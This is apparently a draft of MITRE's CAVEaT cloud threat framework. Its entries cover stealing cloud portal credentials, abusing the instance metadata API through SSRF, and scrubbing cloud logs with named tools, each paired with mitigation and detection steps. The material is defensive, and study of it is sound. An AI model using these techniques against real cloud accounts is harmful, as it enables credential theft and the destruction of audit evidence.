| Harvesting Credentials via Cloud APIs | [Manipulate CI/CD Pipeline](https://mitre.sharepoint.com/:w:/r/sites/CAVEaT/Shared%20Documents/General/CAVEAT%202/Manipulating%20CICD%20Pipeline.docx?d=wb4dab65c56ae46a7ab27fda01af50a5c&csf=1&web=1&e=aP66lg) | [Manipulate CI/CD Pipeline](https://mitre.sharepoint.com/:w:/r/sites/CAVEaT/Shared%20Documents/General/CAVEAT%202/Manipulating%20CICD%20Pipeline.docx?d=wb4dab65c56ae46a7ab27fda01af50a5c&csf=1&web=1&e=aP66lg) | [Manipulate CI/CD Pipeline](https://mitre.sharepoint.com/:w:/r/sites/CAVEaT/Shared%20Documents/General/CAVEAT%202/Manipulating%20CICD%20Pipeline.docx?d=wb4dab65c56ae46a7ab27fda01af50a5c&csf=1&web=1&e=aP66lg) | [Exploiting New Vulnerabilities in Managed Cloud Services](https://mitre.sharepoint.com/:w:/r/sites/CAVEaT/_layouts/15/Doc.aspx?sourcedoc=%7B0f9949ce-67da-48ba-aff6-703a28fa641a%7D&action=edit&wdPid=369c6099) |  | [Data from Backups](https://mitre.sharepoint.com/:w:/r/sites/CAVEaT/Shared%20Documents/General/CAVEAT%202/data%20backups.docx?d=w5e3a997aa7584d7496f2da6ac7e103ba&csf=1&web=1&e=D29mUk) | Leveraging Cloud Storage Services |  | [Denial of Data](https://mitre.sharepoint.com/:w:/r/sites/CAVEaT/Shared%20Documents/General/CAVEAT%202/Denial%20of%20Data.docx?d=w664d87273e274f69908fb1b44f3c6212&csf=1&web=1&e=Qf5XPT) |
| [Implant Container image](https://mitre.sharepoint.com/:w:/r/sites/CAVEaT/Shared%20Documents/General/CAVEAT%202/Implant%20Container%20Image.docx?d=w83d9c2e47a5c4d1ebea1a07388ee2a0a&csf=1&web=1&e=NEcn6q) |  | [Exploit Containers](https://gbc-word-edit.officeapps.live.com/we/wordeditorframe.aspx?ui=en%2DUS&rs=en%2DUS&wopisrc=https%3A%2F%2Fmitre.sharepoint.com%2Fsites%2FCAVEaT%2F_vti_bin%2Fwopi.ashx%2Ffiles%2Fd79aab3892134f83a920739b6452ed6d&wdenableroaming=1&mscc=1&hid=7C00619F-4093-A000-EA2D-A1F46E7D2B5D&wdorigin=ItemsView&wdhostclicktime=1593396883694&jsapi=1&newsession=1&corrid=78c0ad91-e94b-453e-8498-1db76ed96b26&usid=78c0ad91-e94b-453e-8498-1db76ed96b26&sftc=1&instantedit=1&wopicomplete=1&wdredirectionreason=Unified_SingleFlush&rct=Minor&ctp=LeastProtected) |  |  |  |  |  |  |  |
| [Exploiting New Vulnerabilities in Managed Cloud Services](https://mitre.sharepoint.com/:w:/r/sites/CAVEaT/_layouts/15/Doc.aspx?sourcedoc=%7B0f9949ce-67da-48ba-aff6-703a28fa641a%7D&action=edit&wdPid=369c6099) | [Leveraging Cloud Shells](https://mitre.sharepoint.com/:w:/r/sites/CAVEaT/Shared%20Documents/General/CAVEAT%202/Leveraging%20Cloud%20Shells.docx?d=waf8d61f5678e48e194c5a861deabad96&csf=1&web=1&e=6wWq4n) | [IAM Abuse](https://mitre.sharepoint.com/:w:/r/sites/CAVEaT/Shared%20Documents/General/CAVEAT%202/IAM%20Abuse.docx?d=w25f35db716ff4b03bae1a4f3b00e6463&csf=1&web=1&e=A5fHhv) | [Revert Cloud Instance](https://mitre.sharepoint.com/:w:/r/sites/CAVEaT/Shared%20Documents/General/CAVEAT%202/Revert%20Cloud%20Instance.docx?d=w5fcda7681efa49b0b53f9637e4c9c4d2&csf=1&web=1&e=Y2t3Kb) | [Network Share Discovery](https://mitre.sharepoint.com/:w:/r/sites/CAVEaT/Shared%20Documents/General/CAVEAT%202/Network%20Share%20Discovery.docx?d=w9f4459113c53451ca7e5e68c6a64123c&csf=1&web=1&e=nxgy9T) |  | [S3 Blob Manipulation](https://mitre.sharepoint.com/:w:/s/CAVEaT/EQoQbAZZrzZNl3xX98FK2iEBNCmKKXvnVPWKy9e91GTzmA?e=W3UDxg) |  |  |  |
| [Steal ApplicationAccess Token](https://mitre.sharepoint.com/:w:/r/sites/CAVEaT/Shared%20Documents/General/CAVEAT%202/Application%20Access%20Token.docx?d=waed5d65d2329497c93036b68992818ea&csf=1&web=1&e=BnF3n9) |  |  | [Tagging Falsely](https://mitre.sharepoint.com/:w:/r/sites/CAVEaT/Shared%20Documents/General/CAVEAT%202/Tagging%20Falsely.docx?d=w5f14d971cfa948d0a51bd0b7ca48cd87&csf=1&web=1&e=vbEdFf) |  |  |  |  | [S3/Blob manipulation](https://mitre.sharepoint.com/:w:/r/sites/CAVEaT/Shared%20Documents/General/CAVEAT%202/S3-Blob%20manipulation.docx?d=w066c100aaf594d36977c57f7c14ada21&csf=1&web=1&e=IZ7OR5) (combined with 2 other docs) | [Loss of Availability](https://mitre.sharepoint.com/:w:/r/sites/CAVEaT/Shared%20Documents/General/CAVEAT%202/Loss%20of%20Availability.docx?d=w7bcec02e9e8c4d0d87da04c858258ba4&csf=1&web=1&e=007ycc) |
| [S3 Blob Manipulation](https://mitre.sharepoint.com/:w:/s/CAVEaT/EQoQbAZZrzZNl3xX98FK2iEBNCmKKXvnVPWKy9e91GTzmA?e=W3UDxg) | [Redundant Access](https://mitre.sharepoint.com/:w:/r/sites/CAVEaT/Shared%20Documents/General/CAVEAT%202/Redundant%20Access.docx?d=w1db751cc418c49b39eedc2c6c31f85fc&csf=1&web=1&e=VWq9hv) | [Kubernetes API Abuse](https://mitre.sharepoint.com/:w:/r/sites/CAVEaT/Shared%20Documents/General/CAVEAT%202/Kubernetes%20API%20Abuse.docx?d=w0e247aa4140e48b0a334689ac5202928&csf=1&web=1&e=fR4fwf) | [Unused Cloud Regions](https://mitre.sharepoint.com/:w:/r/sites/CAVEaT/Shared%20Documents/General/CAVEAT%202/Unused.docx?d=w8ffaf1a4999b44789e25f311d277d823&csf=1&web=1&e=d6tEhj) | [Permission GroupsDiscovery](https://mitre.sharepoint.com/:w:/r/sites/CAVEaT/Shared%20Documents/General/CAVEAT%202/Permission%20Groups%20Discovery.docx?d=wc29c65b031e24935957c2f6ed168c695&csf=1&web=1&e=kIJ5ZY) |  | [Data from Databases](https://mitre.sharepoint.com/:w:/r/sites/CAVEaT/Shared%20Documents/General/CAVEAT%202/Accessing%20Databases%20Data.docx?d=w59e8db29ea3743948b6ef829ee1803ce&csf=1&web=1&e=NY2M3b) |  |  |  |
| [Stealing Valid Credentialsfrom Local Machines](https://mitre.sharepoint.com/:w:/r/sites/CAVEaT/Shared%20Documents/General/CAVEAT%202/Stealing%20Valid%20Credentials.docx?d=w84e9c0cd1a624d7ab3ced3ca05f3b876&csf=1&web=1&e=YiD6cx) | [Stealing Valid Credentialsfrom Local Machines](https://mitre.sharepoint.com/:w:/r/sites/CAVEaT/Shared%20Documents/General/CAVEAT%202/Stealing%20Valid%20Credentials.docx?d=w84e9c0cd1a624d7ab3ced3ca05f3b876&csf=1&web=1&e=fpf7Xc) | [Stealing Valid Credentialsfrom Local Machines](https://mitre.sharepoint.com/:w:/r/sites/CAVEaT/Shared%20Documents/General/CAVEAT%202/Stealing%20Valid%20Credentials.docx?d=w84e9c0cd1a624d7ab3ced3ca05f3b876&csf=1&web=1&e=MHjxKH) | [Use Deprecated API's](https://mitre.sharepoint.com/:w:/r/sites/CAVEaT/Shared%20Documents/General/CAVEAT%202/Deprecated%20Cloud%20APIs.docx?d=w20b906937a6c4dbfa594148695e6170a&csf=1&web=1&e=0QulkR) | [VM InformationDiscovery](https://mitre.sharepoint.com/:w:/r/sites/CAVEaT/Shared%20Documents/General/CAVEAT%202/System%20Information%20Discovery.docx?d=w7ca368fb37e0479abca2c51eb7bc2e4b&csf=1&web=1&e=hGzcW1) | [Virtual Network Peering](https://mitre.sharepoint.com/:w:/r/sites/CAVEaT/Shared%20Documents/General/CAVEAT%202/virtual%20network%20peering.docx?d=w0f8525c28deb4bf99e18306d3fc41900&csf=1&web=1&e=PWRUz1) | [Data from VM](https://mitre.sharepoint.com/:w:/r/sites/CAVEaT/Shared%20Documents/General/CAVEAT%202/Data%20from%20VM.docx?d=wc7d03e9d0db348648cd995c28d122340&csf=1&web=1&e=HkezHv) |  | [Using Web Servers](https://mitre.sharepoint.com/:w:/r/sites/CAVEaT/Shared%20Documents/General/CAVEAT%202/Web%20Servers.docx?d=w02923b965c8440118353cc868badb933&csf=1&web=1&e=sdkD4Q) | [Loss of Reputation/Value](https://mitre.sharepoint.com/:w:/r/sites/CAVEaT/Shared%20Documents/General/CAVEAT%202/Loss%20of%20Reputation.docx?d=w54e173ba915e4f92968ea31c168252a4&csf=1&web=1&e=bmyUdm) |
| [Trusted Relationship](https://mitre.sharepoint.com/:w:/r/sites/CAVEaT/Shared%20Documents/General/CAVEAT%202/Trusted%20Relationship.docx?d=wed1f072bf4d14680b7f24444ef5ecb39&csf=1&web=1&e=SUSsQZ) |  | [Harvesting Credentials via Cloud APIs](https://mitre.sharepoint.com/:w:/s/CAVEaT/EeJb5nM1QNFMpsqzUMOdGGEBiwhjpAsu-3G_ljz36HBzIA?e=jjM90u) | [White Listing](https://mitre.sharepoint.com/:w:/r/sites/CAVEaT/Shared%20Documents/General/CAVEAT%202/White%20Listing.docx?d=w54bda99a33d0403383e34dcf6050addc&csf=1&web=1&e=NwdEYI) |  | [Exploiting New Vulnerabilities in Managed Cloud Services](https://mitre.sharepoint.com/:w:/r/sites/CAVEaT/_layouts/15/Doc.aspx?sourcedoc=%7B0f9949ce-67da-48ba-aff6-703a28fa641a%7D&action=edit&wdPid=369c6099) | [Exploiting New Vulnerabilities in Managed Cloud Services](https://mitre.sharepoint.com/:w:/r/sites/CAVEaT/_layouts/15/Doc.aspx?sourcedoc=%7B0f9949ce-67da-48ba-aff6-703a28fa641a%7D&action=edit&wdPid=369c6099) |  | [Utilizing Cloud accounts](https://mitre.sharepoint.com/:w:/r/sites/CAVEaT/Shared%20Documents/General/CAVEAT%202/Transfer%20Data%20to%20Cloud%20Account.docx?d=wb0a6ade42b32438a900051d9676d1343&csf=1&web=1&e=aA1rOD) | [Resource Hijacking](https://mitre.sharepoint.com/:w:/r/sites/CAVEaT/Shared%20Documents/General/CAVEAT%202/Resource%20Hijacking.docx?d=w736c155f2e844fcc97f1091ecd78c1bc&csf=1&web=1&e=XmXNlM) |
| [Unencrypted Network Traffic](https://mitre.sharepoint.com/:w:/r/sites/CAVEaT/Shared%20Documents/General/CAVEAT%202/Unecrypted%20Traffic.docx?d=wbc754bdd61f44f10b9ef10f6f658a468&csf=1&web=1&e=SAtZr9) |  | [Sensitive Information Exposed on A Public Platform](https://mitre.sharepoint.com/:w:/s/CAVEaT/Eb39xx_C3gZNil2pe2dz5sgBY7CYMQ7zy0BpRWikyUICDQ?e=iLHRJ6) | [Disable or Modify Security Tools](https://mitre.sharepoint.com/:w:/r/sites/CAVEaT/Shared%20Documents/General/CAVEAT%202/Disable%20or%20Modify%20Security%20Tools.docx?d=wf1d048823b744d34ab03f98e12b55226&csf=1&web=1&e=JVm8S8) |  |  |  |  |  |  |
| [Utilize Breach Replay](https://mitre.sharepoint.com/:w:/r/sites/CAVEaT/Shared%20Documents/General/CAVEAT%202/Utilize%20Breach%20Replay.docx?d=w295b891535ec4f6abbaf1d7d21bcb2a7&csf=1&web=1&e=SI0VlA) |  | [Exploiting New Vulnerabilities in Managed Cloud Services](https://mitre.sharepoint.com/:w:/r/sites/CAVEaT/_layouts/15/Doc.aspx?sourcedoc=%7B0f9949ce-67da-48ba-aff6-703a28fa641a%7D&action=edit&wdPid=369c6099) |  |  |  |  |  |  |  |
| [Weak Passwords](https://mitre.sharepoint.com/:w:/r/sites/CAVEaT/Shared%20Documents/General/CAVEAT%202/Weak%20Passwords.docx?d=we5732f6c19324accb0140783b565f1da&csf=1&web=1&e=YAC76c) |  |  |  |  |  |  |  |  |  |
|  |  |  |  |  |  |  |  |  |  |
|  |  |  |  |  |  |  |  |  |  |


Note: Add port knocking to command and control


# Cloud Admin Portal/API(version 1.0)


**Cloud Service Label: IaaS, PaaS, SaaS**


Description


The cloud admin portal/API is accessible from any place in the world. By design, all Azure and AWS resources are theoretically accessible from this universal interface. Only identity credentials stand in the way of anyone accessing anyone else’s resources and information. The circumstance is not much improved for unclassified government only clouds, which also widely expose their portal and API and again rely on credentials to arbitrate access.


An adversary may use a portal with stolen credentials to gain useful information from an operational cloud environment, such as specific services, resources, and features. For example, the GCP Command Center can be used to view all assets, findings of potential security risks, and to run additional queries, such as finding public IP addresses and open ports.


Passwords to gain access to the portal/API can be stolen from administrator or privileged user workstations that interact with the portal/API through traditional harvesting techniques like spear phishing. 2FA greatly reduces the chance that such attacks will work. However even with 2FA, it may be possible for adversaries to use the token obtained after 2FA authentication for some brief period of time to gain access to your resources, if they have access to the machine that was granted access by 2FA. Within AWS, other accounts without 2FA may still be granted access to some or all of your resources through IAM roles. The portal/APIs themselves are complex web applications that change constantly. As such they may have intermittent security flaws that enable adversaries to by-pass the credential process and gain access to your resources.


Examples




| **Name** | **Description** |
| --- | --- |
| Azure Portal Vulnerability | Azure API was theorized to have a significant flaw checking credentials for certain API routines based on successful demonstrations on Azure Stack Hub version of the portal. |


Mitigations




| **Mitigation** | | **Description** |
| --- | --- | --- |
| [Multi-factor Authentication](https://attack.mitre.org/mitigations/M1032) | | Use multi-factor authentication for user and privileged accounts. Do not manage Cloud portals from machines that perform user email and web browsing tasks. All users should be required to utilize two factor authentication. |
|  | *AWS* | This can be enforced by first creating a policy that would prohibit actions except those that allow a user to change their password or manage 2FA, then attaching a policy to a group that includes all user accounts where they can be allowed all access if they sign in with 2FA. Once these actions are completed it should be tested to verify the access is given correctly. To see full details on how to complete this view AWS documentation at:**https://docs.aws.amazon.com/IAM/latest/UserGuide/tutorial\_users-self-manage-mfa-and-creds.html.** |
|  | *Azure* | This can be done by creating a MFA registration policy. It can than be assigned to all users (with the ability to exclude some if need be, but is not recommended). Make sure once the policy is created and added to users that it is then being enforced, once enforced it should be tested for verification. To see full details on how to complete this view Azure documentation at:**https://docs.microsoft.com/en-us/azure/active-directory/identity-protection/howto-identity-protection-configure-mfa-policy.** |
|  | *GCP* | This can be done by first enabling it on the current account being used by admin to assign the roles, then enable two factor on an instance by instance or project by project basis, then assigning the requirements based on IAM roles and applying it to all users. To see full details on how to complete this view Azure documentation at:**https://cloud.google.com/compute/docs/oslogin/setup-two-factor-authentication.** |
| Least Privilege | | All access given to users in the cloud environment should be assigned by the necessary privileges needed for team members to complete their job responsibilities.Ensure that temporary access tokens are issued rather than permanent credentials, especially when access is being granted to entities outside of the internal security boundary. |
|  | *AWS* | To implement least privilege in an AWS environment IAM policies will be used. This gives the ability to allow users to perform list, read, write, permissions management, or tagging actions. AWS suggests utilizing*last accessed information*and A*WS CloudTrail event history*to get a better understanding of privileges that might be needed or reduced based on a specific role. Full details can be found at**https://docs.aws.amazon.com/IAM/latest/UserGuide/best-practices.html#grant-least-privilege.** |
|  | *Azure* | To implement least privilege in an Azure environment Azure Active Directory roles will be used. Azure outlines different tasks and the least privileged role that are suggested to be associated with the task. Those details can be found at:**https://docs.microsoft.com/en-us/azure/active-directory/users-groups-roles/roles-delegate-by-task.**To learn how to assign specific roles it can be done via the Azure Active Directory Portal. Instructions on how to assign roles can be found here:**https://docs.microsoft.com/en-us/azure/active-directory/users-groups-roles/directory-manage-roles-portal.** |
|  | *GCP* | To implement least privilege in GCP it is recommended to use predefined roles (which allow for granular access permissions) instead of primitive roles (roles/owner, roles/editor, and roles/viewer). Full details on the difference between types of roles can be found here:**https://cloud.google.com/iam/docs/understanding-roles.**To assign these roles IAM service accounts are used and complete details can be found at:**https://cloud.google.com/iam/docs/using-iam-securely#least\_privilege.** |


Detection


Monitor account activity logs to see actions performed and activity associated with the cloud service management console. Some cloud providers, such as AWS and Azure, provide distinct log events for login attempts to the management console.




| **Detection** | **Description** |
| --- | --- |
| Create Log Metric Filters and Alarms for AWS | To create a metric filter and alarm: 1.Create a metric filter that checks for IAM policy changes and the*<cloudtrail\_log\_group\_name>* 2.Create an SNS topic 3.Create an SNS subscription to the above topic 4.Create an alarm associated with the filter and SNS topic created in steps 1 and 2 respectively |
| Monitor Activity in AWS Account | Various services in AWS offer logging features that allow for detection capabilities. These include CloudFront, CloudTrail, CloudWatch, Config, and S3. |
| Monitor for Suspicious Activity in Azure | Azure AD can generate anomaly reports than can be run on a daily basis. Azure AD Identity Protection show current risks in its dashboard and provides daily email summary notifications. Policies can also be configured to alert to specific issues. |
| Create Log Metric Filters and Alarms for CloudTrail | To create a metric filter and alarm: 1.Create a filter that checks for CloudTrail changes and the specific*<cloudtrail\_log\_group\_name>* 2.Create an SNS topic that the alarm will notify 3.Create an SNS subscription to the above topic 4.Create an alarm associated with the filter from step 1 and SNS topic in step 2 |
| Create Activity Log Alerts in Azure | To create log activity alerts for deletion in the Azure Console: 1.Navigate to*Monitor’ / ‘Alerts* 2.Select*Manage alert rules* 3.Click on the Alert*Name*where Condition contains*operationName equals Microsoft.Network/networkSecurityGroups/securityRules/delete* 4.Hover a mouse over*Condition*to ensure it is set to*Whenever the Administrative Activity Log “Delete Security Rule (networkSecurityGroups/securityRules)” has “any” level with “any” status and event is initiated by “any*” |
| Create, View, and Manage Activity Alerts in Azure Monitor | To create a log alert in the Azure portal: 1.Select**Monitor -> Alerts** 2.Select**New alert rule**of the**Alerts**window 3.Provide information in**Define alert condition** 4.Provide details in**Define alert details** 5.Specify action group for new alert rule under**Action group**, or create a new action group with +**New group** 6.Select**Yes**for the**Enable rule upon creation**option 7.Select**Create alert rule** To view and manage alerts: 1.Select**Monitor -> Alerts -> Manage alert rules** 2.Select the rule you want to modify and double-click to edit the rule options 3.Click**Save** |
| Azure Resource Manager Templates | Azure Resource Manager templates in the format of JSON files that can be used to configure metric alerts in Azure Monitor. These templates can be used for simple static and dynamic threshold metric alerts, availability tests, and monitoring multiple resources. |
| Enable CloudTrail across all regions in AWS | To enable CloudTrail across all regions: 1.Sign into the AWS Management Console and open the CloudTrail console 2.Click on*Trails* 3.Set necessary Trails to All option in the I column 4.Click on a trail via the link*Name*column 5.Set*Logging*to*ON* 6.Set*Apply trail to all regions*to*Yes* |
| Configure log profile to capture activity logs for all regions in Azure | To set up activity logs for all regions: 1.Navigate to Azure console 2.Go to*Activity log* 3.Select*Export* 4.Select*Subscription* 5.Check*Select all*in*Regions* 6.Select*Save* |


References


1.<https://aws.amazon.com/blogs/security/how-do-i-protect-cross-account-access-using-mfa-2/>. Accessed February 15, 2020


2.<https://research.checkpoint.com/2020/remote-cloud-execution-critical-vulnerabilities-in-azure-cloud-infrastructure-part-i/>. Accessed February 15, 2020


3.<https://docs.aws.amazon.com/IAM/latest/UserGuide/tutorial_users-self-manage-mfa-and-creds.html>. Accessed July 28, 2020


4.<https://docs.microsoft.com/en-us/azure/active-directory/identity-protection/howto-identity-protection-configure-mfa-policy>. Accessed July 28, 2020


5.https://cloud.google.com/compute/docs/oslogin/setup-two-factor-authentication. Accessed July 28, 2020


6.<https://docs.aws.amazon.com/IAM/latest/UserGuide/best-practices.html#grant-least-privilege>.Accessed July 29, 2020


7.<https://docs.microsoft.com/en-us/azure/active-directory/users-groups-roles/roles-delegate-by-task>.Accessed July 29, 2020


8.<https://docs.microsoft.com/en-us/azure/active-directory/users-groups-roles/directory-manage-roles-portal>.Accessed July 29, 2020


9.<https://cloud.google.com/iam/docs/understanding-roles>.Accessed July 29, 2020


**10.**<https://cloud.google.com/iam/docs/using-iam-securely#least_privilege>.Accessed July 29, 2020  
  



# Cloud Instance Metadata API(version 1.0)


**Cloud Service Label: IaaS**


Description


Adversaries may attempt to access the Cloud Instance Metadata API to collect credentials and other sensitive data. Most cloud service providers support a Cloud Instance Metadata API which is a service provided to running virtual instances that allows applications to access information about the running virtual instance. Available information generally includes name, security group, and additional metadata including sensitive data such as credentials and User Data scripts that may contain additional secrets. The Instance Metadata API is provided as a convenience to assist in managing applications and is accessible by anyone who can access the instance.


If adversaries have a presence on the running virtual instance, they may query the Instance Metadata API directly to identify credentials that grant access to additional resources. Additionally, attackers may exploit a Server-Side Request Forgery (SSRF) vulnerability in a public facing web proxy that allows the attacker to gain access to the sensitive information via a request to the Instance Metadata API.


The de facto standard across cloud service providers is to host the Instance Metadata API athttp://169.254.169.254.


Examples




| **Name** | **Description** |
| --- | --- |
| Capital One Breach | Capital One Breach where a SSRF on a vulnerable application hosted on an AWS server allowed adversary to access server’s metadata instance and forward WAF account credentials back to a local workstation. These credentials had read permissions to numerous S3 buckets for the organization. |


Mitigations




| **Name** | | **Description** |
| --- | --- | --- |
| [Filter Network Traffic](https://attack.mitre.org/mitigations/M1037) | | Cloud service providers support IP-based restrictions when accessing cloud resources. Consider using IP whitelisting along with user account management to ensure that data access is restricted not only to valid users, but only from expected IP ranges to mitigate the use of stolen credentials to access data. |
|  | AWS | An AWS environment can be configured with network ACLs (access control lists) to allow or deny inbound and outbound traffic. This can be accomplished by accessing Amazon VPC and navigating to either inbound or outbound rules depending on the rule the user wishes to add and they can be added, removed, or edited from that panel. Full details about ACLs and how to add rules in AWS can be found here:**https://docs.aws.amazon.com/vpc/latest/userguide/vpc-network-acls.html.** |
|  | Azure | In Azure storage resources can be tied exclusively to a particular virtual network reducing the chances that it can be accessed externally or from other cloud assets. This can be done multiple ways including the Azure Portal, Azure PowerShell, and Azure CLI (Command Line Interface). Depending on the method used to implement this the procedure can vary, but will include the need to create a security group, create a network security group, associate that network security group with a specific subnet and then create security rules that are associated to the inbound and outbound rules for that subnet. Full details on how to configure this utilizing the various methods can be found below: Azure Portal:**https://docs.microsoft.com/en-us/azure/virtual-network/tutorial-filter-network-traffic** Azure PowerShell:**https://docs.microsoft.com/en-us/azure/virtual-network/tutorial-filter-network-traffic-powershell** Azure CLI:**https://docs.microsoft.com/en-us/azure/virtual-network/tutorial-filter-network-traffic-cli** |
| Use AWS update | | AWS metadata service v2 could mitigate Capitol One example, though it is not foolproof and not all encompassing. There are tools that can help with transitioning to V2 such as CloudWatch. For detailed information on the differences between V1 and V2, as well as how to transition from V1 to V2, please refer to AWS documentation at:[**https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/configuring-instance-metadata-service.html**](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/configuring-instance-metadata-service.html)**.** |


Detection


Monitor access to the Instance Metadata API and look for anomalous queries. It may be possible to detect adversary use of credentials they have obtained. See[Valid Accounts](https://attack.mitre.org/techniques/T1078)for more information.




| **Detection** | **Description** |
| --- | --- |
| Create Log Metric Filters and Alarms for AWS | To create a metric filter and alarm: 1.Create a metric filter that checks for IAM policy changes and the*<cloudtrail\_log\_group\_name>* 2.Create an SNS topic 3.Create an SNS subscription to the above topic 4.Create an alarm associated with the filter and SNS topic created in steps 1 and 2 respectively |
| Monitor Activity in AWS Account | Various services in AWS offer logging features that allow for detection capabilities. These include CloudFront, CloudTrail, CloudWatch, Config, and S3. |
| Monitor for Suspicious Activity in Azure | Azure AD can generate anomaly reports than can be run on a daily basis. Azure AD Identity Protection show current risks in its dashboard and provides daily email summary notifications. Policies can also be configured to alert to specific issues. |
| Create Log Metric Filters and Alarms for CloudTrail | To create a metric filter and alarm: 1.Create a filter that checks for CloudTrail changes and the specific*<cloudtrail\_log\_group\_name>* 2.Create an SNS topic that the alarm will notify 3.Create an SNS subscription to the above topic 4.Create an alarm associated with the filter from step 1 and SNS topic in step 2 |
| Create Activity Log Alerts in Azure | To create log activity alerts for deletion in the Azure Console: 1.Navigate to*Monitor’ / ‘Alerts* 2.Select*Manage alert rules* 3.Click on the Alert*Name*where Condition contains*operationName equals Microsoft.Network/networkSecurityGroups/securityRules/delete* 4.Hover a mouse over*Condition*to ensure it is set to*Whenever the Administrative Activity Log “Delete Security Rule (networkSecurityGroups/securityRules)” has “any” level with “any” status and event is initiated by “any*” |
| Create, View, and Manage Activity Alerts in Azure Monitor | To create a log alert in the Azure portal: 1.Select**Monitor -> Alerts** 2.Select**New alert rule**of the**Alerts**window 3.Provide information in**Define alert condition** 4.Provide details in**Define alert details** 5.Specify action group for new alert rule under**Action group**, or create a new action group with +**New group** 6.Select**Yes**for the**Enable rule upon creation**option 7.Select**Create alert rule** To view and manage alerts: 1.Select**Monitor -> Alerts -> Manage alert rules** 2.Select the rule you want to modify and double-click to edit the rule options 3.Click**Save** |
| Azure Resource Manager Templates | Azure Resource Manager templates in the format of JSON files that can be used to configure metric alerts in Azure Monitor. These templates can be used for simple static and dynamic threshold metric alerts, availability tests, and monitoring multiple resources. |
| Enable CloudTrail across all regions in AWS | To enable CloudTrail across all regions: 1.Sign into the AWS Management Console and open the CloudTrail console 2.Click on*Trails* 3.Set necessary Trails to All option in the I column 4.Click on a trail via the link*Name*column 5.Set*Logging*to*ON* 6.Set*Apply trail to all regions*to*Yes* |
| Configure log profile to capture activity logs for all regions in Azure | To set up activity logs for all regions: 1.Navigate to Azure console 2.Go to*Activity log* 3.Select*Export* 4.Select*Subscription* 5.Check*Select all*in*Regions* 6.Select*Save* |


References


1.https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/instancedata-data-retrieval.html. Retrieved February 3, 2020


2.https://redlock.io/blog/instance-metadata-api-a-modern-day-trojan-horse. Retrieved July 16, 2019


3.https://krebsonsecurity.com/2019/08/what-we-can-learn-from-the-capital-one-hack/. Retrieved June 8, 2020


# Cloud Log Scrubbing(version 1.0)


**Cloud Service Label: IaaS, PaaS, SaaS**


Description


Deletion of logs has been a universal technique of adversaries since the dawn of intrusions. Cloud platforms make this practice far more convenient and thorough because most cloud services have a unified interface for accessing and collecting logs from disparate cloud services. With legacy networks it would have required effort for an adversary to determine how a victim was logging each service and where the logs might reside. Logging is now a largely standardized process thanks to Azure and AWS efforts. Adversaries can use cloud provided API’s and logic functions to quickly eliminate problematic log entries. Cloud logs usually leverage standard Cloud object storage which subjects them to data attacks associated with any data stored in Cloud object storage.


Examples




| **Name** | **Description** |
| --- | --- |
| Weird All Cloud Trail Cleaning Scripts | Publicly available scripts to remove log entries from AWS Cloud Trail. |
| Pacu | Pacu’s plug-in modules offer assistance for enumeration, privilege escalation, data exfiltration, service exploitation, and log manipulation within AWS. |
| Delete all AWS logs | The*delete\_all\_awslogs.sh*script will delete AWS logs for a specified region. You can also specify log group names like*/aws/lambda*. |
| Delete Azure Analytics Logs workspace | Adding a ‘-ForceDelete’ tag to the Azure CLI deletion command will permanently delete a workspace. |


Mitigations




| **Mitigation** | | **Description** |
| --- | --- | --- |
| Audit | | Frequently check permissions on cloud storage to ensure proper permissions are set to deny open or unprivileged access to resources. Consider using automated resource checkers such as CloudSploit or Divvycloud. |
|  | AWS | To perform an audit via AWS it is suggested to review information such as account details (credentials, users, groups, roles, etc), mobile applications, EC2 configurations, policies, and account activity. How to audit these different factors can be found in detail at:**https://docs.aws.amazon.com/general/latest/gr/aws-security-audit-guide.html.** |
|  | Azure | To perform an audit via Azure an administrator can review the audit logs that are recorded under Azure’s monitoring for active directory. The audit logs allow for filtering, as well as looking at users, groups, and enterprise specific information. Full details on how to access this information can be found at:**https://docs.microsoft.com/en-us/azure/active-directory/reports-monitoring/concept-audit-logs.** |
|  | GCP | To perform an audit via GCP the logs can be reviewed. GCP breaks this down into three categories; admin activity, data access, and system events. The audit logs can be viewed a few different ways- the console, API, or gcloud. Full details on how to view these logs, how to export, and for how to configure the retention period can be found here:**https://cloud.google.com/logging/docs/audit.** |
| Permissions | | Remove delete permissions to logs associated storage objects from most accounts. |
| Offsite Storage/Processing | | Quickly move logs off the cloud to a local repository,SIEM, or to another separate account owner within the cloud. |
| Recover Azure Log Analytics Workspace | | If an Azure Log Analytics workspace is deleted, the workspace is placed in a soft-delete state, which can be used to recover the deleted data, configuration, and connected agents. |


Detection




| **Detection** | **Description** |
| --- | --- |
| Create Log Metric Filters and Alarms for CloudTrail | To create a metric filter and alarm: 1.Create a filter that checks for CloudTrail changes and the specific*<cloudtrail\_log\_group\_name>* 2.Create an SNS topic that the alarm will notify 3.Create an SNS subscription to the above topic 4.Create an alarm associated with the filter from step 1 and SNS topic in step 2 |
| Create Activity Log Alerts in Azure | To create log activity alerts for deletion in the Azure Console: 1.Navigate to*Monitor’ / ‘Alerts* 2.Select*Manage alert rules* 3.Click on the Alert*Name*where Condition contains*operationName equals Microsoft.Network/networkSecurityGroups/securityRules/delete* 4.Hover a mouse over*Condition*to ensure it is set to*Whenever the Administrative Activity Log “Delete Security Rule (networkSecurityGroups/securityRules)” has “any” level with “any” status and event is initiated by “any*” |


References


1.[https://github.com/carnal0wnage/weirdAAL/wiki/Usage](https://b0k103-cportal2.mitre.org/carnal0wnage/weirdAAL/wiki/,DanaInfo=.agjvkygFjwv,SSL+Usage)- Accessed Feb 22,2020


2.<https://github.com/RhinoSecurityLabs/pacu>. Accessed August 5, 2020.


3.<https://gist.github.com/pahud/1e875cb1252a622173cc2236be5c2963>. Accessed August 5, 2020.


4.<https://docs.aws.amazon.com/awscloudtrail/latest/userguide/cloudtrail-delete-trails-console.html>. Accessed August 5, 2020.


5.<https://docs.microsoft.com/en-us/azure/azure-monitor/platform/delete-workspace>. Accessed August 5, 2020.


# Cloud Service Enumeration(version 1.1)


**Cloud Service Label: IaaS, PaaS**


Description


An adversary may attempt to enumerate the cloud security services running on a system after gaining initial access. These services can differ depending on if it's platform-as-a-service (PaaS), or infrastructure-as-a-service (IaaS). Most security aspects of Cloud services are easily viewed and configured from the cloud service dashboard/portal. Even without the ability to change security settings, the ability to read the security configurations of network firewalls, monitoring agents, etc., enable a significantly greater opportunity to defeat these defenses.


Examples




| **Name** | **Description** |
| --- | --- |
